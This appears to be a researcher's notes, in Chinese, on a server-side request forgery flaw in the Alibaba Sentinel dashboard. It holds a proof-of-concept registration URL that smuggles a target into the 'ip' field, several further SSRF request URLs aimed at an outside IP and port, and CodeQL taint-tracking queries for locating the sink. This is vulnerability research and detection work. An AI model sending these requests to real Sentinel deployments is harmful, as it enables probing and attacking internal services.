# Sentinel

随着微服务的流行，服务和服务之间的稳定性变得越来越重要。Sentinel 是面向分布式服务架构的**轻量级**流量控制产品，主要以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度来帮助您保护服务的稳定性。

[介绍](https://blog.csdn.net/u012190514/article/details/81383698)

## SSRF

https://github.com/alibaba/Sentinel/issues/2451

## source

![image-20220102190441213](img/image-20220102190441213.png)

![image-20220102190456538](img/image-20220102190456538.png)

## sink

![image-20220102190519809](img/image-20220102190519809.png)

exp

```
http://127.0.0.1:8080/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=localhost:12345%23&port=0
```

## codeql

使用污点分析

其他ssrf不过需要登录。

```
http://127.0.0.1:8080/cluster/state_single?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/authority/rules?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/v1/flow/rules?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/paramFlow/rules?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/resource/machineResource.json?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/system/rules.json?ip=1.116.136.120&port=3333&app=test

http://127.0.0.1:8080/gateway/api//list.json?ip=1.116.136.120&port=3333&app=test
```

因为能力有限只能分开弄

```java
/**
 * @id Sentinel
 * @name Ssrf
 * @description Ssrf
 * @kind path-problem
 * @problem.severity warning
 */

import java
import semmle.code.java.dataflow.TaintTracking
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.security.QueryInjection
import DataFlow::PathGraph



class SsrfConfig extends TaintTracking::Configuration {
  SsrfConfig() { this = "SsrfConfig" }

  override predicate isSource(DataFlow::Node src) { 
    src instanceof RemoteFlowSource
  }//默认参数

  override predicate isSink(DataFlow::Node sink) {
    exists(//触发set ip操作
      Parameter p | p = sink.asParameter() and p.getCallable().getName() = "setIp" and p.getName() = "ip"
  )
  }
}

from SsrfConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select source.getNode(), source, sink, "source"
```

```java
import java
    
from MethodAccess call, Method method, DataFlow::Node src
where method.hasName("setIp") and method.getDeclaringType().getAnAncestor().hasQualifiedName("com.alibaba.csp.sentinel.dashboard.discovery", "MachineInfo") and call.getMethod() = method and src instanceof RemoteFlowSource 
select call
```

